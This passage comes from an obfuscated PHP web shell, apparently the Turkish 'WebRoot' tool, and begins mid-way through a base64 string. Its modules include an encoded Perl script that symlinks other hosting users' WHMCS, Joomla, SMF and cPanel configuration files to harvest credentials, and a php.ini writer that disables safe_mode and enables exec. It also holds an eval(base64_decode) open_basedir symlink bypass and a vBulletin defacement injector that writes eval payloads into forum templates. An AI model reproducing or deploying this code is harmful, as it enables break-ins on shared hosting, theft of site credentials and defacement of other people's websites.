Y19odG1sL3N1cHAvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictc3VwcC50eHQnKTsKc3ltbGlu
aygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3NlY3VyZS9jb25maWd1cmF0aW9uLnBocCcs
JGtvbGEuJy1zdWN1cmUudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRt
bC9zZWN1cmUvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXN1Y3VyZS13aG0udHh0Jyk7
CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3MvY29uZmln
dXJhdGlvbi5waHAnLCRrb2xhLictc3VjdXJlLXdobWNzLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8n
LiR1c2VyLicvcHVibGljX2h0bWwvY3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLWNw
YW5lbC50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL3BhbmVsL2Nv
bmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXBhbmVsLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1
c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1ob3N0LnR4
dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdGluZy9jb25maWd1
cmF0aW9uLnBocCcsJGtvbGEuJy1ob3N0aW5nLnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2Vy
LicvcHVibGljX2h0bWwvaG9zdHMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictaG9zdHMudHh0
Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBo
cCcsJGtvbGEuJy1qb29tbGEudHh0Jyk7CnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNf
aHRtbC9zdWJtaXR0aWNrZXQucGhwJywka29sYS4nLXdobWNzMi50eHQnKTsKc3ltbGluaygnL2hv
bWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRrb2xh
LictY2xpZW50cy50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2Ns
aWVudC9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1jbGllbnQudHh0Jyk7CnN5bWxpbmsoJy9o
b21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJGtv
bGEuJy1jbGllbnRlcy50eHQnKTsKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1s
L2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRrb2xhLictY2xpZW50LnR4dCcpOwpzeW1saW5r
KCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9jb25maWd1cmF0aW9u
LnBocCcsJGtvbGEuJy1jbGllbnRzdXBwb3J0LnR4dCcpOwpzeW1saW5rKCcvaG9tZS8nLiR1c2Vy
LicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGtvbGEuJy1iaWxsaW5n
LnR4dCcpOyAKc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25m
aWd1cmF0aW9uLnBocCcsJGtvbGEuJy13aG0tbWFuYWdlLnR4dCcpOyAKc3ltbGluaygnL2hvbWUv
Jy4kdXNlci4nL3B1YmxpY19odG1sL215L2NvbmZpZ3VyYXRpb24ucGhwJywka29sYS4nLXdobS1t
eS50eHQnKTsgCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29u
ZmlndXJhdGlvbi5waHAnLCRrb2xhLictd2htLW15c2hvcC50eHQnKTsgCnN5bWxpbmsoJy9ob21l
LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRrb2xh
LictemVuY2FydC50eHQnKTsgCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC96
ZW5jYXJ0L2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGtvbGEuJy1zaG9wLXplbmNhcnQu
dHh0Jyk7IApzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRl
cy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRrb2xhLictc2hvcC1aQ3Nob3AudHh0Jyk7IApzeW1saW5r
KCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywka29sYS4nLXNtZi50
eHQnKTsgCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3Mu
cGhwJywka29sYS4nLXNtZjIudHh0Jyk7IApzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGlj
X2h0bWwvZm9ydW0vU2V0dGluZ3MucGhwJywka29sYS4nLXNtZi1mb3J1bS50eHQnKTsgCnN5bWxp
bmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywka29s
YS4nLXNtZi1mb3J1bXMudHh0Jyk7IApzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0
bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRrb2xhLictdXAudHh0Jyk7IApzeW1saW5r
KCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvdXAvaW5jbHVkZXMvY29uZmlnLnBocCcsJGtv
bGEuJy11cDIudHh0Jyk7IAp9CmlmICgkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICdQT1NUJykg
ewogIHJlYWQoU1RESU4sICRidWZmZXIsICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOwp9IGVsc2Ug
ewogICRidWZmZXIgPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsKfQpAcGFpcnMgPSBzcGxpdCgvJi8s
ICRidWZmZXIpOwpmb3JlYWNoICRwYWlyIChAcGFpcnMpIHsKICAoJG5hbWUsICR2YWx1ZSkgPSBz
cGxpdCgvPS8sICRwYWlyKTsKICAkbmFtZSA9fiB0ci8rLyAvOwogICRuYW1lID1+IHMvJShbYS1m
QS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7CiAgJHZhbHVlID1+IHRy
LysvIC87CiAgJHZhbHVlID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwg
aGV4KCQxKSkvZWc7CiAgJEZPUk17JG5hbWV9ID0gJHZhbHVlOwp9CmlmICgkRk9STXtwYXNzfSBl
cSAiIil7CnByaW50ICcKPGJvZHkgY2xhc3M9ImR6IiBiZ2NvbG9yPSIjRjRGNEY0Ij4KPHA+V2Vi
Um9vVCBDb25maWcgRnVja2VyPC9wPgo8cD5XZWJSb29ULmluZm88L3A+CjxzcGFuPjxmb250IGNv
bG9yPSJyZWQiPkt1bGxhbmltaTo8L2ZvbnQ+IFBhc3N3ZCBpY2VyaWdpbmkgYXNhZ2lkYWtpIGJv
c2x1Z2EgeWFwaXN0aXJpbml6Li4gPT4gPGZvbnQgY29sb3I9ImJsYWNrIj5jYXQgL2V0Yy9wYXNz
d2Q8L2ZvbnQ+PC9zcGFuPjxiciAvPgo8YnIgLz48Zm9ybSBtZXRob2Q9InBvc3QiPjxzdHJvbmc+
Cjx0ZXh0YXJlYSBpZD0iY2hlY2tvdXR0ZXh0YXJlYSIgbmFtZT0icGFzcyIgc3R5bGU9ImJvcmRl
cjoxcHggZG90dGVkICMwMEZGRkY7IHdpZHRoOiAgNDk4cHg7IGhlaWdodDogMzcwcHg7IGJhY2tn
cm91bmQtY29sb3I6I0Y0RjRGNDsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNpemU6OXB0OyBj
b2xvcjogYmxhY2siICA+PC90ZXh0YXJlYT48YnIgLz4KJm5ic3A7PHA+CjxpbnB1dCBuYW1lPSJ0
YXIiIHR5cGU9InRleHQiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjMDBGRkZGOyB3aWR0aDog
MjEycHg7IGJhY2tncm91bmQtY29sb3I6I0Y0RjRGNDsgZm9udC1mYW1pbHk6VGFob21hOyBmb250
LXNpemU6OHB0OyBjb2xvcjpibGFjazsgIiAgLz48YnIgLz4KJm5ic3A7PC9wPgo8cD4KPGlucHV0
IG5hbWU9IlN1Ym1pdDEiIHR5cGU9InN1Ym1pdCIgdmFsdWU9IkNvbmZpZyBDZWsiIHN0eWxlPSJi
b3JkZXI6MXB4IGRvdHRlZCAjMDBGRkZGOyB3aWR0aDogOTk7IGZvbnQtZmFtaWx5OlRhaG9tYTsg
Zm9udC1zaXplOjEwcHQ7IGNvbG9yOiBibGFjazsgdGV4dC10cmFuc2Zvcm06dXBwZXJjYXNlOyBo
ZWlnaHQ6MjM7IGJhY2tncm91bmQtY29sb3I6I0Y0RjRGNDsiIC8+PC9wPgo8L2Zvcm0+PC9zdHJv
bmc+Cic7Cn1lbHNlewpAbGluZXMgPTwkRk9STXtwYXNzfT47CiR5ID0gQGxpbmVzOwpvcGVuIChN
WUZJTEUsICI+dGFyLnRtcCIpOwpwcmludCBNWUZJTEUgInRhciAtY3pmICIuJEZPUk17dGFyfS4i
LnRhciAiOwpmb3IgKCRrYT0wOyRrYTwkeTska2ErKyl7CndoaWxlKEBsaW5lc1ska2FdICA9fiBt
LyguKj8pOng6L2cpewombGlsKCQxKTsKcHJpbnQgTVlGSUxFICQxLiIudHh0ICI7CmZvcigka2Q9
MTska2Q8MTg7JGtkKyspewpwcmludCBNWUZJTEUgJDEuJGtkLiIudHh0ICI7Cn0KfQogfQpwcmlu
dCc8Ym9keSBjbGFzcz0iZHoiIGJnY29sb3I9IiNGNEY0RjQiPgo8aDI+VGFtYW1MYW5kaS4uITwv
aDI+CjxwPiZuYnNwOzwvcD4nOwppZigkRk9STXt0YXJ9IG5lICIiKXsKb3BlbihJTkZPLCAidGFy
LnRtcCIpOwpAbGluZXMgPTxJTkZPPiA7CmNsb3NlKElORk8pOwpzeXN0ZW0oQGxpbmVzKTsKcHJp
bnQnPHA+PGEgaHJlZj0iJy4kRk9STXt0YXJ9LicudGFyIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+
CjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiPkNsaWNrIEhlcmUgVG8gRG93bmxv
YWQgVGFyIEZpbGU8L3NwYW4+PC9mb250PjwvYT48L3A+JzsKfQp9CiBwcmludCIKPC9ib2R5Pgo8
L2h0bWw+Ijs=';
            $IIIIIIIllIlI = fopen('config.root', 'w+');
            $IIIIIIIllIll = fwrite($IIIIIIIllIlI, base64_decode($IIIIIIIllI1l));
            fclose($IIIIIIIllIlI);
            chmod('config.root', 0755);
            echo '<iframe src=configweb/config.root width=100% height=620px frameborder=0></iframe> ';
        break;
        case 'php_ini':
            $IIIIIIIlI11I = 'php.ini';
            $IIIIIIIlI11l = "$IIIIIIIlI11I";
            $IIIIIIIlI111 = fopen($IIIIIIIlI11l, 'w') or die('Dosya a&#231;&#305;lamad&#305;!');
            $IIIIIIIllIII = 'safe_mode = off
exec = On
shell_exec = On';
            fwrite($IIIIIIIlI111, $IIIIIIIllIII);
            fclose($IIIIIIIlI111);
            echo '<center><img src=http://oi61.tinypic.com/ng9co9.jpg></center>';
            echo '<center><b><font color=red>Safe mod ve kapal fonksiyonlar deaktif edildi. <a href="?">Ana dizin</a></b></font></center>';
        break;
        case 'open':
            $IIIIIIIllI11 = 'bypass';
            if ($_REQUEST['basedir'] != $IIIIIIIllI11) {
                echo '<iframe src=cp width=100% height=100% frameborder=0></iframe> ';
                exit;
            }
            eval(base64_decode('JGZha2VkaXI9ImN4IjsKJGZha2VkZXA9MTY7CgokbnVtPTA7IC8vIG9mZnNldCBvZiBzeW1saW5r
LiRudW0KCmlmKCFlbXB0eSgkX0dFVFsnZmlsZSddKSkgJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKZWxz
ZSBpZighZW1wdHkoJF9QT1NUWydmaWxlJ10pKSAkZmlsZT0kX1BPU1RbJ2ZpbGUnXTsKZWxzZSAk
ZmlsZT0iIjsKCmVjaG8gJzxQUkU+PGltZwpzcmM9Imh0dHA6Ly9pbWc4MTAuaW1hZ2VzaGFjay51
cy9pbWc4MTAvODA0My93ZWJyMDB0MTIucG5nIj48UD5Xo99Sb29UIFN5bWxpbmsgU2hlbGwgPGEK
aHJlZj0iaHR0cDovL3dlYnIwMHQuaW5mby8iPjwvYT4KPHA+UEhQIDUuMi4xMSA1LjMuMCBzeW1s
aW5rIG9wZW5fYmFzZWRpciBieXBhc3MKPHA+RGFoYSBGYXpsYXMxOiA8YSBocmVmPSJodHRwOi8v
d2VicjAwdC5pbmZvLyI+V6PfUm9vVDwvYT4KPHA+PGZvcm0gbmFtZT0iZm9ybSIKIGFjdGlvbj0i
P3dlYnIwMHQ9c3ltbGluayZieXBhc3M9Y3AiIG1ldGhvZD0icG9zdCI+PGlucHV0IHR5cGU9InRl
eHQiIG5hbWU9ImZpbGUiIHNpemU9IjUwIgp2YWx1ZT0iJy5odG1sc3BlY2lhbGNoYXJzKCRmaWxl
KS4nIj48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJoeW0iCnZhbHVlPSJDcmVhdGUgU3ltbGlu
ayI+PC9mb3JtPic7CgppZihlbXB0eSgkZmlsZSkpCiAgICBleGl0OwoKaWYoIWlzX3dyaXRhYmxl
KCIuIikpCiAgICBkaWUoIm5vdCB3cml0YWJsZSBkaXJlY3RvcnkiKTsKCiRsZXZlbD0wOwoKZm9y
KCRhcz0wOyRhczwkZmFrZWRlcDskYXMrKyl7CiAgICBpZighZmlsZV9leGlzdHMoJGZha2VkaXIp
KQogICAgICAgIG1rZGlyKCRmYWtlZGlyKTsKICAgIGNoZGlyKCRmYWtlZGlyKTsKfQoKd2hpbGUo
MTwkYXMtLSkgY2hkaXIoIi4uIik7CgokaGFyZHN0eWxlID0gZXhwbG9kZSgiLyIsICRmaWxlKTsK
CmZvcigkYT0wOyRhPGNvdW50KCRoYXJkc3R5bGUpOyRhKyspewogICAgaWYoIWVtcHR5KCRoYXJk
c3R5bGVbJGFdKSl7CiAgICAgICAgaWYoIWZpbGVfZXhpc3RzKCRoYXJkc3R5bGVbJGFdKSkgCiAg
ICAgICAgICAgIG1rZGlyKCRoYXJkc3R5bGVbJGFdKTsKICAgICAgICBjaGRpcigkaGFyZHN0eWxl
WyRhXSk7CiAgICAgICAgJGFzKys7CiAgICB9Cn0KJGFzKys7CndoaWxlKCRhcy0tKQogICAgY2hk
aXIoIi4uIik7CgpAcm1kaXIoImZha2VzeW1saW5rIik7CkB1bmxpbmsoImZha2VzeW1saW5rIik7
CgpAc3ltbGluayhzdHJfcmVwZWF0KCRmYWtlZGlyLiIvIiwkZmFrZWRlcCksImZha2VzeW1saW5r
Iik7CgovLyB0aGlzIGxvb3Agd2lsbCBza2lwIGFsbHJlYWR5IGNyZWF0ZWQgc3ltbGlua3MuCndo
aWxlKDEpCiAgICBpZih0cnVlPT0oQHN5bWxpbmsoImZha2VzeW1saW5rLyIuc3RyX3JlcGVhdCgi
Li4vIiwkZmFrZWRlcC0xKS4kZmlsZSwKInN5bWxpbmsiLiRudW0pKSkgYnJlYWs7CiAgICBlbHNl
ICRudW0rKzsKCkB1bmxpbmsoImZha2VzeW1saW5rIik7Cm1rZGlyKCJmYWtlc3ltbGluayIpOwoK
ZGllKCc8Rk9OVCBDT0xPUj0iUkVEIj5jaGVjayBzeW1saW5rIDxhCmhyZWY9Ii4vc3ltbGluaycu
JG51bS4nIj5zeW1saW5rJy4kbnVtLic8L2E+IGZpbGU8L0ZPTlQ+Jyk7'));
        break;
        case 'indexer':
            mkdir('indexer', 0755);
            chdir('indexer');
            $IIIIIIIlllII = 'PHAgYWxpZ249InJpZ2h0Ij48L3A+PGJvZHkgYmdjb2xvcj0iI0ZGRkZGRiI+IAo8P3BocCAKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyBCZWdpbmluZyBvZiBDb2RpbmcgOykgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyAKZXJyb3JfcmVwb3J0aW5nKDApOyAKCiAgICAkaW5mbyA9ICRfU0VSVkVSWydTRVJWRVJfU09GVFdBUkUnXTsgCiAgICAkc2l0ZSA9IGdldGVudigiSFRUUF9IT1NUIik7IAogICAgJHBhZ2UgPSAkX1NFUlZFUlsnU0NSSVBUX05BTUUnXTsgCiAgICAkc25hbWUgPSAkX1NFUlZFUlsnU0VSVkVSX05BTUUnXTsgCiAgICAkdW5hbWUgPSBwaHBfdW5hbWUoKTsgCiAgICAkc21vZCA9IGluaV9nZXQoJ3NhZmVfbW9kZScpOyAKICAgICRkaXNmdW5jID0gaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKTsgCiAgICAkeW91cmlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107IAogICAgJHNlcnZlcmlwID0gJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ107IAogICAgJHZlcnNpb24gPSBwaHB2ZXJzaW9uKCk7IAogICAgJGNjYyA9IHJlYWxwYXRoKCRfR0VUWydjaGRpciddKS4iLyI7IAogICAgJGZkZWwgPSAkX0dFVFsnZmRlbCddOyAKICAgICRleGVjdXRlID0gJF9QT1NUWydleGVjdXRlJ107IAogICAgJGNtZCA9ICRfUE9TVFsnY21kJ107IAogICAgJGNvbW1hbmRlciA9ICRfUE9TVFsnY29tbWFuZGVyJ107IAogICAgJGxzID0gImxzIC1sYSI7IAogICAgJHNvdXJjZSA9ICRfUE9TVFsnc291cmNlJ107IAogICAgJGdvbWtmID0gJF9QT1NUWydnb21rZiddOyAKICAgICR0aXRsZSA9ICRfUE9TVFsndGl0bGUnXTsgCiAgICAkc291cmNlZ28gPSAkX1BPU1RbJ3NvdXJjZWdvJ107IAogICAgJGZ0ZW1wID0gInRtcCI7IAogICAgJHRlbXAgPSB0ZW1wbmFtKCRmdGVtcCwgImN4Iik7IAogICAgJGZjb3B5ID0gJF9QT1NUWydmY29weSddOyAKICAgICR0dXNlciA9ICRfUE9TVFsndHVzZXInXTsgCiAgICAkdXNlciA9ICRfUE9TVFsndXNlciddOyAKICAgICR3ZGlyID0gJF9QT1NUWyd3ZGlyJ107IAogICAgJHRkaXIgPSAkX1BPU1RbJ3RkaXInXTsgCiAgICAkc3ltZ28gPSAkX1BPU1RbJ3N5bWdvJ107IAogICAgJHN5bSA9ICJ4aGFja2Vycy50eHQiOyAKICAgICR0byA9ICRfUE9TVFsndG8nXTsgCiAgICAkc2JqY3QgPSAkX1BPU1RbJ3NiamN0J107IAogICAgJG1zZyA9ICRfUE9TVFsnbXNnJ107IAogICAgJGhlYWRlciA9ICJGcm9tOiIuJF9QT1NUWydoZWFkZXInXTsgCgoKLy9QSFBpbmZvIAoKaWYoaXNzZXQoJF9QT1NUWydwaHBpbmZvJ10pKSAKeyAKICAgIGRpZShwaHBpbmZvKCkpOyAKfSAKLy9HdXZlbmxpIG1vZCB2cyB2cyAKaWYgKCRzbW9kKSAKeyAKICAgICRjX2ggPSAiPGZvbnQgY29sb3I9cmVkIGZhY2U9J1ZlcmRhbmEnIHNpemU9JzEnPk9OPC9mb250PiI7IAp9IAplbHNlIAp7IAogICAgJGNfaCA9ICI8Zm9udCBmYWNlPSdWZXJkYW5hJyBzaXplPScxJyBjb2xvcj1ncmVlbj5PRkY8L2ZvbnQ+IjsgCn0gCgovL0thcGFsaSBGb25rc2l5b25sYXIgCmlmICgnJz09KCRkaXNmdW5jKSkgCnsgCiAgICAkZGlzID0gIjxmb250IGNvbG9yPWdyZWVuPk5vbmU8L2ZvbnQ+IjsgCn0gCmVsc2UgCnsgCiAgICAkZGlzID0gIjxmb250IGNvbG9yPXJlZD4kZGlzZnVuYzwvZm9udD4iOyAKfSAKLy9EaXppbiBkZWdpc2ltaSAKaWYoaXNzZXQoJF9HRVRbJ2RpciddKSAmJiBpc19kaXIoJF9HRVRbJ2RpciddKSkgCnsgCiBjaGRpcigkX0dFVFsnZGlyJ10pOyAKfSAKCiRjY2MgPSByZWFscGF0aCgkX0dFVFsnY2hkaXInXSkuIi8iOyAKCi8vQmFzbGlrIAplY2hvICI8aGVhZD4gCjxzdHlsZT4gCmJvZHkgeyBmb250LXNpemU6IDEycHg7IAoKICAgICAgICAgICBmb250LWZhbWlseTogYXJpYWwsIGhlbHZldGljYTsgCgogICAgICAgICAgICBzY3JvbGxiYXItd2lkdGg6IDU7IAoKICAgICAgICAgICAgc2Nyb2xsYmFyLWhlaWdodDogNTsgCgogICAgICAgICAgICBzY3JvbGxiYXItZmFjZS1jb2xvcjogYmxhY2s7IAoKICAgICAgICAgICAgc2Nyb2xsYmFyLXNoYWRvdy1jb2xvcjogc2lsdmVyOyAKCiAgICAgICAgICAgIHNjcm9sbGJhci1oaWdobGlnaHQtY29sb3I6IHNpbHZlcjsgCgogICAgICAgICAgICBzY3JvbGxiYXItM2RsaWdodC1jb2xvcjpzaWx2ZXI7IAoKICAgICAgICAgICAgc2Nyb2xsYmFyLWRhcmtzaGFkb3ctY29sb3I6IHNpbHZlcjsgCgogICAgICAgICAgICBzY3JvbGxiYXItdHJhY2stY29sb3I6IGJsYWNrOyAKCiAgICAgICAgICAgIHNjcm9sbGJhci1hcnJvdy1jb2xvcjogc2lsdmVyOyAKCiAgICB9IAo8L3N0eWxlPiAKCjx0aXRsZT5Mb2xpcG9wPC90aXRsZT48L2hlYWQ+IjsgCi8vQW5hIHRhYmxvIAplY2hvICI8Ym9keSB0ZXh0PScjRkZGRkZGJz4gCjx0YWJsZSBib3JkZXI9JzEnIHdpZHRoPScxMDAlJyBpZD0ndGFibGUxJyBib3JkZXI9JzEnIGNlbGxQYWRkaW5nPTUgY2VsbFNwYWNpbmc9MCBib3JkZXJDb2xvckRhcms9IzY2NjY2NiBib3JkZXJjb2xvcmxpZ2h0PScjQzBDMEMwJz4gCjwvdGFibGU+IjsgCmVjaG8gJzx0ZD48Zm9udCBjb2xvcj0iI0NDMDAwMCI+PHN0cm9uZz48L3N0cm9uZz48L2ZvbnQ+PGZvbnQgY29sb3I9IiMwMDAwMDAiPjwvZW0+PC9mb250PiAgICA8L3RyPiAKJzsgCi8vQnV0b24gTGlzdGVzaSAKZWNobyAiPGNlbnRlcj48Zm9ybSBtZXRob2Q9UE9TVCBhY3Rpb24nJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT12YnVsbGV0aW4gdmFsdWU9J1ZCIEhBQ0suJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1teWJ1bGxldGluIHZhbHVlPSdNeUJCIEhBQ0suJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1waHBiYiB2YWx1ZT0nICBwaHBCQiBIQUNLLiAgJz48aW5wdXQgdHlwZT1zdWJtaXQgbmFtZT1zbWYgdmFsdWU9JyAgU01GIEhBQ0suICAnPjwvZm9ybT48L2NlbnRlcj4iOyAKCgoKCi8vVkIgSEFDSyAKaWYgKGlzc2V0KCRfUE9TVFsndmJ1bGxldGluJ10pKSAKeyAKZWNobyAiPGNlbnRlcj48dGFibGUgYm9yZGVyPTAgd2lkdGg9JzEwMCUnPiAKPHRyPjx0ZD4gCjxjZW50ZXI+PGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz49PSBWQiBpbmRleGVyID09PC9mb250PjwvY2VudGVyPiAKICAgIDxjZW50ZXI+PGZvcm0gbWV0aG9kPVBPU1QgYWN0aW9uPScnPjxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+TXlzcWwgSG9zdDwvZm9udD48YnI+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWRiaCB2YWx1ZT1sb2NhbGhvc3Qgc2l6ZT0nNTAnIHN0eWxlPSdmb250LXNpemU6IDhwdDsgY29sb3I6ICMwMDAwMDA7IGZvbnQtZmFtaWx5OiBUYWhvbWE7IGJvcmRlcjogMXB4IHNvbGlkICM2NjY2NjY7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPjxicj4gCiAgICAgICAgICA8Zm9udCBmYWNlPSdBcmlhbCcgY29sb3I9JyMwMDAwMDAnPkRiS3VsbGFuaWNpPGJyPjwvZm9udD48aW5wdXQgdHlwZT10ZXh0IG5hbWU9ZGJ1IHNpemU9JzUwJyBzdHlsZT0nZm9udC1zaXplOiA4cHQ7IGNvbG9yOiAjMDAwMDAwOyBmb250LWZhbWlseTogVGFob21hOyBib3JkZXI6IDFweCBzb2xpZCAjNjY2NjY2OyBiYWNrZ3JvdW5kLWNvbG9yOiAjRkZGRkZGJz48YnI+IAogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EYmFkaTxicj48L2ZvbnQ+PGlucHV0IHR5cGU9dGV4dCBuYW1lPWRibiBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKCQkgIAogICAgICAgICAgPGZvbnQgZmFjZT0nQXJpYWwnIGNvbG9yPScjMDAwMDAwJz5EYnNpZnJlPGJyPjwvZm9udD48aW5wdXQgdHlwZT1wYXNzd29yZCBuYW1lPWRicCBzaXplPSc1MCcgc3R5bGU9J2ZvbnQtc2l6ZTogOHB0OyBjb2xvcjogIzAwMDAwMDsgZm9udC1mYW1pbHk6IFRhaG9tYTsgYm9yZGVyOiAxcHggc29saWQgIzY2NjY2NjsgYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRic+PGJyPiAKICAgICAgICAgIDxmb250IGZhY2U9J0FyaWFsJyBjb2xvcj0nIzAwMDAwMCc+aW5kZXhpbiBZYXppbGFjYWdpIEJvbHVtPC9mb250Pjxicj48dGV4dGFyZWEgbmFtZT1pbmRleCByb3dzPScxOScgY29scz0nMTAzJyBzdHlsZT0nY29sb3I6ICMwMDAwMDA7IGJhY2tncm91bmQtY29sb3I6ICNGRkZGRkYnPmJ1cmF5YSBpbmRleGluaXogZ2VsZWNlay5pbmRleGkgeWF6IHBvc3RhbGEga2F5IGdpdHNpbi48L3RleHRhcmVhPjxicj4gCiAgICAgICAgICA8aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9J0theSBHaXRzaW4hJyA+PC9mb3JtPjwvY2VudGVyPjwvdGQ+PC90cj48L3RhYmxlPjwvY2VudGVyPiI7IApkaWUoKTsgCn0gCiR3ZWJyMDB0PSJQb3dlcmVkIEJ5IFdlYlJvb1QiOyAKJGRiaCA9ICRfUE9TVFsnZGJoJ107IAokZGJ1ID0gJF9QT1NUWydkYnUnXTsgCiRkYm4gPSAkX1BPU1RbJ2RibiddOyAKJGRicCA9ICRfUE9TVFsnZGJwJ107IAokaW5kZXggPSAkX1BPU1RbJ2luZGV4J107IAokaW5kZXg9c3RyX3JlcGxhY2UoIlwnIiwiJyIsJGluZGV4KTsgCiRzZXRfaW5kZXggID0gIntcJHtldmFsKGJhc2U2NF9kZWNvZGUoXCciOyAKCiRzZXRfaW5kZXggLj0gYmFzZTY0X2VuY29kZSgiZWNobyBcIiRpbmRleFwiOyIpOyAKCgokc2V0X2luZGV4IC49ICJcJykpfX17XCR7ZXhpdCgpfX08L3RleHRhcmVhPiI7IAoKCmlmICghZW1wdHkoJGRiaCkgJiYgIWVtcHR5KCRkYnUpICYmICFlbXB0eSgkZGJuKSAmJiAhZW1wdHkoJGluZGV4KSkgCnsgCm15c3FsX2Nvbm5lY3QoJGRiaCwkZGJ1LCRkYnApIG9yIGRpZShteXNxbF9lcnJvcigpKTsgCm15c3FsX3NlbGVjdF9kYigkZGJuKSBvciBkaWUobXlzcWxfZXJyb3IoKSk7IAokbG9saTEgPSAiVVBEQVRFIHRlbXBsYXRlIFNFVCB0ZW1wbGF0ZT0nIi4kc2V0X2luZGV4LiIiLiR3ZWJyMDB0LiInIFdIRVJFIHRpdGxlPSdzcGFjZXJfb3BlbiciOyAKJGxvbGkyID0gIlVQREFURSB0ZW1wbGF0ZSBTRVQgdGVtcGxhdGU9JyIuJHNldF9pbmRleC4iIi4kd2VicjAwdC4iJyBXSEVSRSB0aXRsZT0nRk9SVU1IT01FJyI7IAokbG9saTMgPSAiVVBEQVRFIHN0eWxlIFNFVCBjc3M9JyIuJHNldF9pbmRleC4iIi4kd2VicjAwdC4iJywgc3R5bGV2YXJzPScnLCBjc3Njb2xvcnM9JycsIGVkaXRvcnN0eWxlcz0nJyI7IAokcmVzdWx0ID0gbXlzcWxfcXVlcnkoJGxvbGkxKSBvciBkaWUgKG15c3FsX2Vycm9yKCkpOyAKJHJlc3VsdCA9IG15c3FsX3F1ZXJ5KCRsb2xpMikgb3IgZGllIChteXNxbF9lcnJvcigpKTsgCiRyZXN1bHQgPSBteXNxbF